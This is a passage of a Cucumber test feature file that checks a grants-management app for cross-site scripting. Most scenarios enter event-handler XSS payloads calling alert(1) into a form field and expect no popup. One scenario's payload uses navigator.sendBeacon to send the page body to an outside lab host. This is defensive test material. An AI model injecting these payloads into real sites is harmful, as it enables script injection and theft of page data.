      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                     | Field                |
      | <xss onkeypress="alert(1)" contenteditable style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300839 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                  | Field                |
      | <xss onkeyup="alert(1)" contenteditable style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300840 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                      | Field                |
      | <xss onmousedown="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300841 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                       | Field                |
      | <xss onmouseenter="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300842 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                       | Field                |
      | <xss onmouseleave="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300843 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                      | Field                |
      | <xss onmousemove="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300844 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                     | Field                |
      | <xss onmouseout="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300845 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                      | Field                |
      | <xss onmouseover="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300846 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                    | Field                |
      | <xss onmouseup="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300847 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                             | Field                |
      | <xss onmousewheel=alert(1) style=display:block>requires scrolling | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300848 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                              | Field                |
      | <video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300849 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                 | Field                |
      | <body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300850 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                          | Field                |
      | <a onpaste="alert(1)" contenteditable>test</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300851 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                            | Field                |
      | <audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300852 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                     | Field                |
      | <xss onpointerdown=alert(1) style=display:block>XSS</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300853 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                      | Field                |
      | <xss onpointerenter=alert(1) style=display:block>XSS</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300854 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                      | Field                |
      | <xss onpointerleave=alert(1) style=display:block>XSS</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300855 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                     | Field                |
      | <xss onpointermove=alert(1) style=display:block>XSS</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
